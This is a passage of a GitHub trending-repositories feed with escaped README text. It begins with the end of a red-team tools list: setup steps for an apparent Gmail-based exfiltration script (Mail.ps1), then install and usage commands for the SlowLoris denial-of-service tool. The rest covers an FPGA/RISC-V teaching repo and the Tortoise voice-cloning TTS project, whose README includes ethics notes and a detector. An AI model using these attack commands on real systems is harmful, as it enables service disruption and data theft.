by going to &lt;a href=&#34;https://myaccount.google.com/lesssecureapps&#34;&gt;https://myaccount.google.com/lesssecureapps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Modify the &lt;code&gt;$username&lt;/code&gt; &amp;amp; &lt;code&gt;$password&lt;/code&gt; variables for your account in the Mail.ps1 Powershell file&lt;/li&gt; &#xA; &lt;li&gt;Modify &lt;code&gt;$msg.From&lt;/code&gt; &amp;amp; &lt;code&gt;$msg.To.Add&lt;/code&gt; with throwaway gmail address&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/206573667-7dec0942-f9ce-4946-871f-24e4521b6411.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Impact&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/gkbrk/slowloris&#34;&gt;SlowLoris&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Slowloris is a type of denial-of-service (DoS) attack that involves sending HTTP requests to a web server in a way that ties up the server&#39;s resources, preventing it from being able to process legitimate requests.&lt;/p&gt; &#xA;&lt;p&gt;This attack would typically be conducted with a botnet, it is designed to be difficult to detect and mitigate, as it uses a relatively small number of connections and does not generate a large amount of traffic.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Pip)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo pip3 install slowloris&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Git)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/gkbrk/slowloris.git&#xA;cd slowloris&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Pip&#xA;slowloris example.com&#xA;&#xA;# Git&#xA;python3 slowloris.py example.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210115630-b6541ee0-ad82-471a-9a7e-7f0ec028c67d.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>BrunoLevy/learn-fpga</title>
    <updated>2023-01-02T01:29:48Z</updated>
    <id>tag:github.com,2023-01-02:/BrunoLevy/learn-fpga</id>
    <link href="https://github.com/BrunoLevy/learn-fpga" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Learning FPGA, yosys, nextpnr, and RISC-V&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;learn-fpga&lt;/h1&gt; &#xA;&lt;p&gt;&lt;em&gt;Learning FPGA, yosys, nextpnr, and RISC-V&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;Mission statement: create teaching material for FPGAs, processor design and RISC-V, using around $40 per students.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/BrunoLevy/learn-fpga/master/FemtoRV/TUTORIALS/Images/IceStick_hello.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;FemtoRV: a minimalistic RISC-V CPU&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/BrunoLevy/learn-fpga/master/FemtoRV/README.md&#34;&gt;FemtoRV&lt;/a&gt; is a minimalistic RISC-V design, with easy-to-read Verilog sources directly written from the RISC-V specification. The most elementary version (quark), an RV32I core, weights 400 lines of VERILOG (documented version), and 100 lines if you remove the comments. There are also more elaborate versions, the biggest one (petitbateau) is an RV32IMFC core. The repository also includes a companion SoC, with drivers for an UART, a led matrix, a small OLED display, SPI RAM and SDCard. Its most basic configuration fits on the Lattice IceStick (&amp;lt; 1280 LUTs). It can be used for teaching processor design and RISC-V programming.&lt;/p&gt; &#xA;&lt;h2&gt;Playing with LiteX: plug-and-play system to assemble SOCs&lt;/h2&gt; &#xA;&lt;p&gt;The repository includes &lt;a href=&#34;https://raw.githubusercontent.com/BrunoLevy/learn-fpga/master/LiteX/README.md&#34;&gt;LiteX examples&lt;/a&gt;. The &lt;a href=&#34;https://github.com/enjoy-digital/litex&#34;&gt;LiteX&lt;/a&gt; framework is a well designed and an easy-to-use framework to create SoCs. It lets you create a SoC by assembling components (processor, SDRAM controller, SDCard controller, USB, ...) in Python. FemtoRV is directly supported by LiteX (that directly downloads it from this repository when selected as the SoC&#39;s processor).&lt;/p&gt; &#xA;&lt;h2&gt;From Blinky to RISC-V&lt;/h2&gt; &#xA;&lt;p&gt;In &lt;a href=&#34;https://github.com/BrunoLevy/learn-fpga/raw/master/FemtoRV/TUTORIALS/FROM_BLINKER_TO_RISCV/README.md&#34;&gt;Episode I&lt;/a&gt;, you will learn to build your own RISC-V processor, step by step, starting from the simplest design (that blinks a LED), to a fully functional RISC-V core that can compute and display graphics.&lt;/p&gt; &#xA;&lt;p&gt;In &lt;a href=&#34;https://github.com/BrunoLevy/learn-fpga/raw/master/FemtoRV/TUTORIALS/FROM_BLINKER_TO_RISCV/PIPELINE.md&#34;&gt;Episode II&lt;/a&gt;, you will learn how to design a pipelined processor.&lt;/p&gt; &#xA;&lt;h2&gt;Basic: more basic things I wrote during May 2020 - June 2020&lt;/h2&gt; &#xA;&lt;p&gt;Files are &lt;a href=&#34;https://github.com/BrunoLevy/learn-fpga/tree/master/Basic&#34;&gt;here&lt;/a&gt;. This includes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Blinker: the &#34;hello world&#34; program&lt;/li&gt; &#xA; &lt;li&gt;LedMatrix: play with a 8x8 let matrix, driven by a MAX7219 IC.&lt;/li&gt; &#xA; &lt;li&gt;OLed: play with a SSD1351 OLed display, driven by a 4-wire SPI protocol.&lt;/li&gt; &#xA; &lt;li&gt;Serial: access the included USB-virtual UART pins&lt;/li&gt; &#xA; &lt;li&gt;LedTerminal: display scrolling messages on the LED matrix, obtained from the USB virtual UART&lt;/li&gt; &#xA; &lt;li&gt;FOMU: simple examples for the &#34;FPGA in a USB dongle&#34;, including the FrankenVGA experiment !&lt;/li&gt; &#xA; &lt;li&gt;ULX3S HDMI: simple self-contained heavily commented HDMI example.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>neonbjb/tortoise-tts</title>
    <updated>2023-01-02T01:29:48Z</updated>
    <id>tag:github.com,2023-01-02:/neonbjb/tortoise-tts</id>
    <link href="https://github.com/neonbjb/tortoise-tts" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A multi-voice TTS system trained with an emphasis on quality&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;TorToiSe&lt;/h1&gt; &#xA;&lt;p&gt;Tortoise is a text-to-speech program built with the following priorities:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Strong multi-voice capabilities.&lt;/li&gt; &#xA; &lt;li&gt;Highly realistic prosody and intonation.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;This repo contains all the code needed to run Tortoise TTS in inference mode.&lt;/p&gt; &#xA;&lt;p&gt;A (&lt;em&gt;very&lt;/em&gt;) rough draft of the Tortoise paper is now available in doc format. I would definitely appreciate any comments, suggestions or reviews: &lt;a href=&#34;https://docs.google.com/document/d/13O_eyY65i6AkNrN_LdPhpUjGhyTNKYHvDrIvHnHe1GA&#34;&gt;https://docs.google.com/document/d/13O_eyY65i6AkNrN_LdPhpUjGhyTNKYHvDrIvHnHe1GA&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Version history&lt;/h3&gt; &#xA;&lt;h4&gt;v2.4; 2022/5/17&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Removed CVVP model. Found that it does not, in fact, make an appreciable difference in the output.&lt;/li&gt; &#xA; &lt;li&gt;Add better debugging support; existing tools now spit out debug files which can be used to reproduce bad runs.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;v2.3; 2022/5/12&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;New CLVP-large model for further improved decoding guidance.&lt;/li&gt; &#xA; &lt;li&gt;Improvements to read.py and do_tts.py (new options)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;v2.2; 2022/5/5&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added several new voices from the training set.&lt;/li&gt; &#xA; &lt;li&gt;Automated redaction. Wrap the text you want to use to prompt the model but not be spoken in brackets.&lt;/li&gt; &#xA; &lt;li&gt;Bug fixes&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;v2.1; 2022/5/2&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Added ability to produce totally random voices.&lt;/li&gt; &#xA; &lt;li&gt;Added ability to download voice conditioning latent via a script, and then use a user-provided conditioning latent.&lt;/li&gt; &#xA; &lt;li&gt;Added ability to use your own pretrained models.&lt;/li&gt; &#xA; &lt;li&gt;Refactored directory structures.&lt;/li&gt; &#xA; &lt;li&gt;Performance improvements &amp;amp; bug fixes.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What&#39;s in a name?&lt;/h2&gt; &#xA;&lt;p&gt;I&#39;m naming my speech-related repos after Mojave desert flora and fauna. Tortoise is a bit tongue in cheek: this model is insanely slow. It leverages both an autoregressive decoder &lt;strong&gt;and&lt;/strong&gt; a diffusion decoder; both known for their low sampling rates. On a K80, expect to generate a medium sized sentence every 2 minutes.&lt;/p&gt; &#xA;&lt;h2&gt;Demos&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;http://nonint.com/static/tortoise_v2_examples.html&#34;&gt;this page&lt;/a&gt; for a large list of example outputs.&lt;/p&gt; &#xA;&lt;p&gt;Cool application of Tortoise+GPT-3 (not by me): &lt;a href=&#34;https://twitter.com/lexman_ai&#34;&gt;https://twitter.com/lexman_ai&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Usage guide&lt;/h2&gt; &#xA;&lt;h3&gt;Colab&lt;/h3&gt; &#xA;&lt;p&gt;Colab is the easiest way to try this out. I&#39;ve put together a notebook you can use here: &lt;a href=&#34;https://colab.research.google.com/drive/1wVVqUPqwiDBUVeWWOUNglpGhU3hg_cbR?usp=sharing&#34;&gt;https://colab.research.google.com/drive/1wVVqUPqwiDBUVeWWOUNglpGhU3hg_cbR?usp=sharing&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Local Installation&lt;/h3&gt; &#xA;&lt;p&gt;If you want to use this on your own computer, you must have an NVIDIA GPU.&lt;/p&gt; &#xA;&lt;p&gt;First, install pytorch using these instructions: &lt;a href=&#34;https://pytorch.org/get-started/locally/&#34;&gt;https://pytorch.org/get-started/locally/&lt;/a&gt;. On Windows, I &lt;strong&gt;highly&lt;/strong&gt; recommend using the Conda installation path. I have been told that if you do not do this, you will spend a lot of time chasing dependency problems.&lt;/p&gt; &#xA;&lt;p&gt;Next, install TorToiSe and it&#39;s dependencies:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git clone https://github.com/neonbjb/tortoise-tts.git&#xA;cd tortoise-tts&#xA;python setup.py install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you are on windows, you will also need to install pysoundfile: &lt;code&gt;conda install -c conda-forge pysoundfile&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;do_tts.py&lt;/h3&gt; &#xA;&lt;p&gt;This script allows you to speak a single phrase with one or more voices.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python tortoise/do_tts.py --text &#34;I&#39;m going to speak this&#34; --voice random --preset fast&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;read.py&lt;/h3&gt; &#xA;&lt;p&gt;This script provides tools for reading large amounts of text.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python tortoise/read.py --textfile &amp;lt;your text to be read&amp;gt; --voice random&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will break up the textfile into sentences, and then convert them to speech one at a time. It will output a series of spoken clips as they are generated. Once all the clips are generated, it will combine them into a single file and output that as well.&lt;/p&gt; &#xA;&lt;p&gt;Sometimes Tortoise screws up an output. You can re-generate any bad clips by re-running &lt;code&gt;read.py&lt;/code&gt; with the --regenerate argument.&lt;/p&gt; &#xA;&lt;h3&gt;API&lt;/h3&gt; &#xA;&lt;p&gt;Tortoise can be used programmatically, like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;reference_clips = [utils.audio.load_audio(p, 22050) for p in clips_paths]&#xA;tts = api.TextToSpeech()&#xA;pcm_audio = tts.tts_with_preset(&#34;your text here&#34;, voice_samples=reference_clips, preset=&#39;fast&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Voice customization guide&lt;/h2&gt; &#xA;&lt;p&gt;Tortoise was specifically trained to be a multi-speaker model. It accomplishes this by consulting reference clips.&lt;/p&gt; &#xA;&lt;p&gt;These reference clips are recordings of a speaker that you provide to guide speech generation. These clips are used to determine many properties of the output, such as the pitch and tone of the voice, speaking speed, and even speaking defects like a lisp or stuttering. The reference clip is also used to determine non-voice related aspects of the audio output like volume, background noise, recording quality and reverb.&lt;/p&gt; &#xA;&lt;h3&gt;Random voice&lt;/h3&gt; &#xA;&lt;p&gt;I&#39;ve included a feature which randomly generates a voice. These voices don&#39;t actually exist and will be random every time you run it. The results are quite fascinating and I recommend you play around with it!&lt;/p&gt; &#xA;&lt;p&gt;You can use the random voice by passing in &#39;random&#39; as the voice name. Tortoise will take care of the rest.&lt;/p&gt; &#xA;&lt;p&gt;For the those in the ML space: this is created by projecting a random vector onto the voice conditioning latent space.&lt;/p&gt; &#xA;&lt;h3&gt;Provided voices&lt;/h3&gt; &#xA;&lt;p&gt;This repo comes with several pre-packaged voices. Voices prepended with &#34;train_&#34; came from the training set and perform far better than the others. If your goal is high quality speech, I recommend you pick one of them. If you want to see what Tortoise can do for zero-shot mimicing, take a look at the others.&lt;/p&gt; &#xA;&lt;h3&gt;Adding a new voice&lt;/h3&gt; &#xA;&lt;p&gt;To add new voices to Tortoise, you will need to do the following:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Gather audio clips of your speaker(s). Good sources are YouTube interviews (you can use youtube-dl to fetch the audio), audiobooks or podcasts. Guidelines for good clips are in the next section.&lt;/li&gt; &#xA; &lt;li&gt;Cut your clips into ~10 second segments. You want at least 3 clips. More is better, but I only experimented with up to 5 in my testing.&lt;/li&gt; &#xA; &lt;li&gt;Save the clips as a WAV file with floating point format and a 22,050 sample rate.&lt;/li&gt; &#xA; &lt;li&gt;Create a subdirectory in voices/&lt;/li&gt; &#xA; &lt;li&gt;Put your clips in that subdirectory.&lt;/li&gt; &#xA; &lt;li&gt;Run tortoise utilities with --voice=&amp;lt;your_subdirectory_name&amp;gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Picking good reference clips&lt;/h3&gt; &#xA;&lt;p&gt;As mentioned above, your reference clips have a profound impact on the output of Tortoise. Following are some tips for picking good clips:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Avoid clips with background music, noise or reverb. These clips were removed from the training dataset. Tortoise is unlikely to do well with them.&lt;/li&gt; &#xA; &lt;li&gt;Avoid speeches. These generally have distortion caused by the amplification system.&lt;/li&gt; &#xA; &lt;li&gt;Avoid clips from phone calls.&lt;/li&gt; &#xA; &lt;li&gt;Avoid clips that have excessive stuttering, stammering or words like &#34;uh&#34; or &#34;like&#34; in them.&lt;/li&gt; &#xA; &lt;li&gt;Try to find clips that are spoken in such a way as you wish your output to sound like. For example, if you want to hear your target voice read an audiobook, try to find clips of them reading a book.&lt;/li&gt; &#xA; &lt;li&gt;The text being spoken in the clips does not matter, but diverse text does seem to perform better.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Advanced Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Generation settings&lt;/h3&gt; &#xA;&lt;p&gt;Tortoise is primarily an autoregressive decoder model combined with a diffusion model. Both of these have a lot of knobs that can be turned that I&#39;ve abstracted away for the sake of ease of use. I did this by generating thousands of clips using various permutations of the settings and using a metric for voice realism and intelligibility to measure their effects. I&#39;ve set the defaults to the best overall settings I was able to find. For specific use-cases, it might be effective to play with these settings (and it&#39;s very likely that I missed something!)&lt;/p&gt; &#xA;&lt;p&gt;These settings are not available in the normal scripts packaged with Tortoise. They are available, however, in the API. See &lt;code&gt;api.tts&lt;/code&gt; for a full list.&lt;/p&gt; &#xA;&lt;h3&gt;Prompt engineering&lt;/h3&gt; &#xA;&lt;p&gt;Some people have discovered that it is possible to do prompt engineering with Tortoise! For example, you can evoke emotion by including things like &#34;I am really sad,&#34; before your text. I&#39;ve built an automated redaction system that you can use to take advantage of this. It works by attempting to redact any text in the prompt surrounded by brackets. For example, the prompt &#34;[I am really sad,] Please feed me.&#34; will only speak the words &#34;Please feed me&#34; (with a sad tonality).&lt;/p&gt; &#xA;&lt;h3&gt;Playing with the voice latent&lt;/h3&gt; &#xA;&lt;p&gt;Tortoise ingests reference clips by feeding them through individually through a small submodel that produces a point latent, then taking the mean of all of the produced latents. The experimentation I have done has indicated that these point latents are quite expressive, affecting everything from tone to speaking rate to speech abnormalities.&lt;/p&gt; &#xA;&lt;p&gt;This lends itself to some neat tricks. For example, you can combine feed two different voices to tortoise and it will output what it thinks the &#34;average&#34; of those two voices sounds like.&lt;/p&gt; &#xA;&lt;h4&gt;Generating conditioning latents from voices&lt;/h4&gt; &#xA;&lt;p&gt;Use the script &lt;code&gt;get_conditioning_latents.py&lt;/code&gt; to extract conditioning latents for a voice you have installed. This script will dump the latents to a .pth pickle file. The file will contain a single tuple, (autoregressive_latent, diffusion_latent).&lt;/p&gt; &#xA;&lt;p&gt;Alternatively, use the api.TextToSpeech.get_conditioning_latents() to fetch the latents.&lt;/p&gt; &#xA;&lt;h4&gt;Using raw conditioning latents to generate speech&lt;/h4&gt; &#xA;&lt;p&gt;After you&#39;ve played with them, you can use them to generate speech by creating a subdirectory in voices/ with a single &#34;.pth&#34; file containing the pickled conditioning latents as a tuple (autoregressive_latent, diffusion_latent).&lt;/p&gt; &#xA;&lt;h3&gt;Send me feedback!&lt;/h3&gt; &#xA;&lt;p&gt;Probabilistic models like Tortoise are best thought of as an &#34;augmented search&#34; - in this case, through the space of possible utterances of a specific string of text. The impact of community involvement in perusing these spaces (such as is being done with GPT-3 or CLIP) has really surprised me. If you find something neat that you can do with Tortoise that isn&#39;t documented here, please report it to me! I would be glad to publish it to this page.&lt;/p&gt; &#xA;&lt;h2&gt;Tortoise-detect&lt;/h2&gt; &#xA;&lt;p&gt;Out of concerns that this model might be misused, I&#39;ve built a classifier that tells the likelihood that an audio clip came from Tortoise.&lt;/p&gt; &#xA;&lt;p&gt;This classifier can be run on any computer, usage is as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-commandline&#34;&gt;python tortoise/is_this_from_tortoise.py --clip=&amp;lt;path_to_suspicious_audio_file&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This model has 100% accuracy on the contents of the results/ and voices/ folders in this repo. Still, treat this classifier as a &#34;strong signal&#34;. Classifiers can be fooled and it is likewise not impossible for this classifier to exhibit false positives.&lt;/p&gt; &#xA;&lt;h2&gt;Model architecture&lt;/h2&gt; &#xA;&lt;p&gt;Tortoise TTS is inspired by OpenAI&#39;s DALLE, applied to speech data and using a better decoder. It is made up of 5 separate models that work together. I&#39;ve assembled a write-up of the system architecture here: &lt;a href=&#34;https://nonint.com/2022/04/25/tortoise-architectural-design-doc/&#34;&gt;https://nonint.com/2022/04/25/tortoise-architectural-design-doc/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Training&lt;/h2&gt; &#xA;&lt;p&gt;These models were trained on my &#34;homelab&#34; server with 8 RTX 3090s over the course of several months. They were trained on a dataset consisting of ~50k hours of speech data, most of which was transcribed by &lt;a href=&#34;http://www.github.com/neonbjb/ocotillo&#34;&gt;ocotillo&lt;/a&gt;. Training was done on my own &lt;a href=&#34;https://github.com/neonbjb/DL-Art-School&#34;&gt;DLAS&lt;/a&gt; trainer.&lt;/p&gt; &#xA;&lt;p&gt;I currently do not have plans to release the training configurations or methodology. See the next section..&lt;/p&gt; &#xA;&lt;h2&gt;Ethical Considerations&lt;/h2&gt; &#xA;&lt;p&gt;Tortoise v2 works considerably better than I had planned. When I began hearing some of the outputs of the last few versions, I began wondering whether or not I had an ethically unsound project on my hands. The ways in which a voice-cloning text-to-speech system could be misused are many. It doesn&#39;t take much creativity to think up how.&lt;/p&gt; &#xA;&lt;p&gt;After some thought, I have decided to go forward with releasing this. Following are the reasons for this choice:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;It is primarily good at reading books and speaking poetry. Other forms of speech do not work well.&lt;/li&gt; &#xA; &lt;li&gt;It was trained on a dataset which does not have the voices of public figures. While it will attempt to mimic these voices if they are provided as references, it does not do so in such a way that most humans would be fooled.&lt;/li&gt; &#xA; &lt;li&gt;The above points could likely be resolved by scaling up the model and the dataset. For this reason, I am currently withholding details on how I trained the model, pending community feedback.&lt;/li&gt; &#xA; &lt;li&gt;I am releasing a separate classifier model which will tell you whether a given audio clip was generated by Tortoise or not. See &lt;code&gt;tortoise-detect&lt;/code&gt; above.&lt;/li&gt; &#xA; &lt;li&gt;If I, a tinkerer with a BS in computer science with a ~$15k computer can build this, then any motivated corporation or state can as well. I would prefer that it be in the open and everyone know the kinds of things ML can do.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Diversity&lt;/h3&gt; &#xA;&lt;p&gt;The diversity expressed by ML models is strongly tied to the datasets they were trained on.&lt;/p&gt; &#xA;&lt;p&gt;Tortoise was trained primarily on a dataset consisting of audiobooks. I made no effort to balance diversity in this dataset. For this reason, Tortoise will be particularly poor at generating the voices of minorities or of people who speak with strong accents.&lt;/p&gt; &#xA;&lt;h2&gt;Looking forward&lt;/h2&gt; &#xA;&lt;p&gt;Tortoise v2 is about as good as I think I can do in the TTS world with the resources I have access to. A phenomenon that happens when training very large models is that as parameter count increases, the communication bandwidth needed to support distributed training of the model increases multiplicatively. On enterprise-grade hardware, this is not an issue: GPUs are attached together with exceptionally wide buses that can accommodate this bandwidth. I cannot afford enterprise hardware, though, so I am stuck.&lt;/p&gt; &#xA;&lt;p&gt;I want to mention here that I think Tortoise could do be a &lt;strong&gt;lot&lt;/strong&gt; better. The three major components of Tortoise are either vanilla Transformer Encoder stacks or Decoder stacks. Both of these types of models have a rich experimental history with scaling in the NLP realm. I see no reason to believe that the same is not true of TTS.&lt;/p&gt; &#xA;&lt;p&gt;The largest model in Tortoise v2 is considerably smaller than GPT-2 large. It is 20x smaller that the original DALLE transformer. Imagine what a TTS model trained at or near GPT-3 or DALLE scale could achieve.&lt;/p&gt; &#xA;&lt;p&gt;If you are an ethical organization with computational resources to spare interested in seeing what this model could do if properly scaled out, please reach out to me! I would love to collaborate on this.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;p&gt;This project has garnered more praise than I expected. I am standing on the shoulders of giants, though, and I want to credit a few of the amazing folks in the community that have helped make this happen:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hugging Face, who wrote the GPT model and the generate API used by Tortoise, and who hosts the model weights.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/2102.12092.pdf&#34;&gt;Ramesh et al&lt;/a&gt; who authored the DALLE paper, which is the inspiration behind Tortoise.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/2102.09672.pdf&#34;&gt;Nichol and Dhariwal&lt;/a&gt; who authored the (revision of) the code that drives the diffusion model.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/2106.07889.pdf&#34;&gt;Jang et al&lt;/a&gt; who developed and open-sourced univnet, the vocoder this repo uses.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/lucidrains&#34;&gt;lucidrains&lt;/a&gt; who writes awesome open source pytorch models, many of which are used here.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://huggingface.co/patrickvonplaten&#34;&gt;Patrick von Platen&lt;/a&gt; whose guides on setting up wav2vec were invaluable to building my dataset.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Notice&lt;/h2&gt; &#xA;&lt;p&gt;Tortoise was built entirely by me using my own hardware. My employer was not involved in any facet of Tortoise&#39;s development.&lt;/p&gt; &#xA;&lt;p&gt;If you use this repo or the ideas therein for your research, please cite it! A bibtex entree can be found in the right pane on GitHub.&lt;/p&gt;</summary>
  </entry>
</feed>